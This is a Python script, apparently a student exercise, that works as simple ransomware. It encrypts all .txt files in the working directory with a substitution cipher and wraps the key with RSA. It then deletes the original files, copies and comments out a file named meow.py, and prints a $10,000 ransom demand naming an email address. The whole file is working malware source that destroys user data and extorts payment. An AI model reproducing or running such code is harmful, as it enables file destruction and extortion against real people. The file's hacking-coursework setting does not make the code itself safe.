import glob, random, sys, os
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import PKCS1_OAEP
from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

#generate a random symmetric key, ask more on this becos of ur ceasar cipher/subsitiution
#key is the sorted alphabets then compare and store into the plaintext
#message = data in text files
alphabets = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

def translatemessage(data, key):
	charsA = alphabets
	charsB = key
	translated = ''
	#translate the message again, swap A and B
	charsA, charsB = charsB, charsA
	for symbol in data:
		if symbol.upper() in charsA:
			symIndex = charsA.find(symbol.upper())
			if symbol.isupper():
				translated += charsB[symIndex].upper()
			else:
				translated += charsB[symIndex].lower()
		else:
			translated += symbol
	return translated

def getRandomKey():
   randomList = list(alphabets)
   random.shuffle(randomList)
   return ''.join(randomList)

key = getRandomKey()

#encrypt the message in txt file
def encrypt():
	for file_name in glob.glob('*.txt'):
		with open(file_name,'rb') as tf:
			data = tf.read()
			#print(data)
			with open(file_name[:-4]+".enc",'wb') as tf:
				#decode data in bytes to string
				decoded_data = data.decode("utf-8")
				translated_data = translatemessage(decoded_data, key)
				#print(translated_data)

				#encode data in string to bytes
				encoded_data = translated_data.encode("utf-8")
				#print(encoded_data)	
				tf.write(encoded_data)
				tf.close()

#need to use RSA to encrypt
recipient_key = RSA.import_key(open("ransomprvkey.pem").read()) 
file_out = open("key.bin", "wb") 
cipher_rsa = PKCS1_OAEP.new(recipient_key) 
rsa_key = key.encode("utf-8")
#print(rsa_key)
enc_data = cipher_rsa.encrypt(rsa_key) 
file_out.write(enc_data) 
file_out.close()

#remove .txt files
def remove_file():
	for file_name in glob.glob('*.txt'):
		with open(file_name,'rb') as tf:
			os.remove(file_name)

#commenting all .py files, ask isit just normal py files but not py contains encrypt and decrypt
#replicate from one python file to another
def replicate_pyfile():
	Filein = open("meow.py",'r')#open file to read
	all_contents = Filein.readlines()
	Filein.close()

	Fileout = open("meow_copy.py",'w')#open file to write
	Fileout.writelines(all_contents)
	Fileout.close()

def comment_pyfile():
	string_to_add = "#"
	with open("meow.py",'r') as f:
		lines = f.readlines()
	lines = ['#' +line for line in lines]
	with open("meow.py",'w') as f:
		f.writelines(lines)


#send message
def send_message():
	print("Your text files are encrypted. To decrypt them, you need to pay me $10,000 and send key.bin in your folder to sjateo01@myuow.edu.au")

encrypt()
remove_file()
replicate_pyfile()
comment_pyfile()
send_message()


